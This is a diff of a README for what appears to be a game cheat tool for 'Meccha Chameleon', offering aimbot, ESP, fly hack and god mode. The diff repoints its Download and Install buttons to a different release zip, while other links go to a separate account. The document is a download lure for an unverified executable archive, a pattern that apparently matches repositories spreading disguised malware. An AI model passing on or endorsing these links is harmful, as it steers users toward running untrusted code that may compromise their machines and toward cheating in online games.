@@ -8,7 +8,7 @@ ESP · Aimbot · Fly Hack · Teleport · God Mode · Infinite Paint
 
 ---
 
-| [![Download](https://img.shields.io/badge/⬇️_Download-2ea043?style=for-the-badge&logo=github&logoColor=white&labelColor=1a7a37)](https://github.com/GroundSpinnerFall/MECCHA-CHAMELEON-MecchaZenith/releases/download/Meccha-Zenith/MecchaZenith.zip) | [![Features](https://img.shields.io/badge/✨_Features-1f6feb?style=for-the-badge&labelColor=0d47a1)](https://github.com/PitShipwrightGraph/MecchaZenith#-features) | [![Install](https://img.shields.io/badge/⚙️_Install-ea7f2e?style=for-the-badge&labelColor=bf5e1a)](https://github.com/GroundSpinnerFall/MECCHA-CHAMELEON-MecchaZenith/releases/download/Meccha-Zenith/MecchaZenith.zip) | [![Support](https://img.shields.io/badge/💬_Support-8b5cf6?style=for-the-badge&labelColor=5b2d8e)](https://github.com/PitShipwrightGraph/MecchaZenith#-support) |
+| [![Download](https://img.shields.io/badge/⬇️_Download-2ea043?style=for-the-badge&logo=github&logoColor=white&labelColor=1a7a37)](https://github.com/GroundSpinnerFall/MECCHA-CHAMELEON-PaintTools/releases/download/MecchaPaintTools/MecchaPaintTools.zip) | [![Features](https://img.shields.io/badge/✨_Features-1f6feb?style=for-the-badge&labelColor=0d47a1)](https://github.com/PitShipwrightGraph/MecchaZenith#-features) | [![Install](https://img.shields.io/badge/⚙️_Install-ea7f2e?style=for-the-badge&labelColor=bf5e1a)](https://github.com/GroundSpinnerFall/MECCHA-CHAMELEON-PaintTools/releases/download/MecchaPaintTools/MecchaPaintTools.zip) | [![Support](https://img.shields.io/badge/💬_Support-8b5cf6?style=for-the-badge&labelColor=5b2d8e)](https://github.com/PitShipwrightGraph/MecchaZenith#-support) |
 |:---:|:---:|:---:|:---:|
 
 </div>
